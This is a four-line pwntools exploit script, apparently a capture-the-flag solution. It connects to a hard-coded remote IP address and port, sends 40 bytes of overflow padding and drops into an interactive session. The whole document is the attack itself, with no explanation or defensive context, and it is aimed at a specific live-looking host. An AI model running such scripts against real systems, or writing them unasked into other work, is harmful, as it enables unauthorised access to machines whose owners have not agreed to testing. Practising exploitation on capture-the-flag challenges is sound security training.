from pwn import*
p = remote('49.235.243.206',10501)
p.send('1'*0x28)
p.interactive()
